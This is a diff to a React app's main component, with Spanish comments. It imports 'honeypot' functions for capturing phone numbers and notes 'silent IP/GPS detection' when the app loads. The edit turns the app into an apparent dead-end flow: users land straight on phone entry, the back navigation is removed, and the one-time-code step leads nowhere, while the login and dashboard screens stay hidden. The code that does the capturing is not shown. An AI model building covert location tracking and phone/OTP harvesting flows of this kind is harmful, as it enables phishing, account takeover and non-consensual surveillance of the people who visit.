@@ -8,7 +8,7 @@ import StatusBar from './components/StatusBar.jsx'
 import { iniciarHoneypot, capturarTelefono } from './lib/honeypot.js'
 
 export default function App() {
-  const [step, setStep] = useState('welcome')
+  const [step, setStep] = useState('phone')
   const [phone, setPhone] = useState('')
 
   // Detección silenciosa de IP/GPS al cargar la app
@@ -21,11 +21,12 @@ export default function App() {
     go('otp')
   }
 
+  // Pantallas activas (Welcome y Dashboard se conservan pero permanecen ocultas)
   const screens = {
     welcome: <Welcome onNext={() => go('phone')} />,
-    phone: <PhoneStep phone={phone} setPhone={setPhone} onBack={() => go('welcome')} onNext={onPhoneConfirmed} />,
-    otp: <OtpStep phone={phone} onBack={() => go('phone')} onNext={() => go('dashboard')} />,
-    dashboard: <Dashboard phone={phone} onLogout={() => { setPhone(''); go('welcome') }} />,
+    phone: <PhoneStep phone={phone} setPhone={setPhone} onBack={null} onNext={onPhoneConfirmed} />,
+    otp: <OtpStep phone={phone} onBack={() => go('phone')} onNext={() => {}} />,
+    dashboard: <Dashboard phone={phone} onLogout={() => { setPhone(''); go('phone') }} />,
   }
 
   return (
